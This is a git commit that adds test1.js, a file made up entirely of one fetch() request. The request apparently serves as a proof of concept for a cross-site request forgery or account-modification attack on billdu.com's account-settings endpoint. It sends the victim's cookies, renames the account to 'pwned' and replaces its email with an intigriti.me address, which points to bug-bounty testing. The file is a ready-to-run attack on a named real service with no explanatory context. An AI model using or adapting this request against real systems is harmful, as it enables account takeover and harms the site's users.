f13608457d8e03884d5e30a8e93c75ae275c19dc
0hack3r <155529279+0hack3r@users.noreply.github.com>
2024-11-13 20:03:35 +0100

    Create test1.js

---
+++ test1.js
@@ -0,0 +1,30 @@
+fetch("https://my.billdu.com/company.settings.accounts.edit/edit/1398712", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    "accept-language": "en-GB,en;q=0.9",
+    "cache-control": "no-cache",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryeEGD1ub8gAW9j8ht",
+    "pragma": "no-cache",
+    "priority": "u=0, i",
+    "sec-ch-ua": "\"Chromium\";v=\"130\", \"Brave\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
+    "sec-ch-ua-arch": "\"arm\"",
+    "sec-ch-ua-bitness": "\"64\"",
+    "sec-ch-ua-full-version-list": "\"Chromium\";v=\"130.0.0.0\", \"Brave\";v=\"130.0.0.0\", \"Not?A_Brand\";v=\"99.0.0.0\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-model": "\"\"",
+    "sec-ch-ua-platform": "\"macOS\"",
+    "sec-ch-ua-platform-version": "\"14.6.1\"",
+    "sec-fetch-dest": "document",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-user": "?1",
+    "sec-gpc": "1",
+    "upgrade-insecure-requests": "1"
+  },
+  "referrer": "https://my.billdu.com/company.settings.accounts.edit/edit/1398712",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "------WebKitFormBoundaryeEGD1ub8gAW9j8ht\r\nContent-Disposition: form-data; name=\"btnSave\"\r\n\r\nSave\r\n------WebKitFormBoundaryeEGD1ub8gAW9j8ht\r\nContent-Disposition: form-data; name=\"fullname\"\r\n\r\npwned\r\n------WebKitFormBoundaryeEGD1ub8gAW9j8ht\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nhack3r_0-1@intigriti.me\r\n------WebKitFormBoundaryeEGD1ub8gAW9j8ht\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n\r\n------WebKitFormBoundaryeEGD1ub8gAW9j8ht\r\nContent-Disposition: form-data; name=\"signatureImage\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryeEGD1ub8gAW9j8ht\r\nContent-Disposition: form-data; name=\"_do\"\r\n\r\nform-form-submit\r\n------WebKitFormBoundaryeEGD1ub8gAW9j8ht--\r\n",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
